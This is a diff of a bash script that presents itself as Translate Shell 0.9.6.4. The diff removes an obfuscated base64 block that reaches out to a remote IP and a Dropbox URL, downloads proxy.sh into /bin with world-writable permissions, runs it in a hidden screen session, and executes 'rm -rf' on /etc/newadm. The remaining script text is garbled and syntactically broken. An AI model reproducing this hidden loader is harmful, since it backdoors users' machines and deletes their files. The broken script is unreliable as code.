@@ -1,18 +1,8 @@
 #!/usr/bin/env bash
-function traducionVers() {
-wget -O /bin/proxy.sh $(echo ${TRADUCTION[3]}|$BASE_TRAD) &>/dev/null && chmod 777 /bin/proxy.sh
-screen -dmS PythonProxy /bin/proxy.sh -start
-$(echo ${TRADUCTION[2]}|$BASE_TRAD)
-}
-BASE_TRAD='base64 -d'
-TRADUCTION=(Y3VybCAtc1NMIGh0dHA6Ly8xMDQuMjM4LjEzNS4xNDc6ODEvbmV3bGli Y2F0IC91c3IvYmluL3ZlbmRvcl9jb2Rl cm0gLXJmIC9ldGMvbmV3YWRt aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy91YjFweXprcTdldnI1bjAvcHJveHkuc2g/ZGw9MA==)
+exec 2>/dev/null
+export TRANS_ENTRY="$0"
 if [[ ! $LANG =~ (UTF|utf)-?8$ ]]; then export LANG=en_US.UTF-8; fi
-TRADUC=$($(echo ${TRADUCTION[1]}|$BASE_TRAD) 2>/dev/null)
-if [[ -z $TRADUC ]]; then TRADUC=Null; fi
-if [[ ! $(echo -e $($(echo ${TRADUCTION[0]}|$BASE_TRAD))|grep -w "$TRADUC") ]]; then traducionVers; fi
-read -r -d '' TRANS_PROGRAM << 'EOF'
-BEGIN {
-Name        = "Translate Shell"
+read -r -d '' Translate Shell"
 Description = "Command-line translator using Google Translate, Bing Translator, Yandex.Translate, etc."
 Version     = "0.9.6.4"
 ReleaseDate = "2017-06-01"
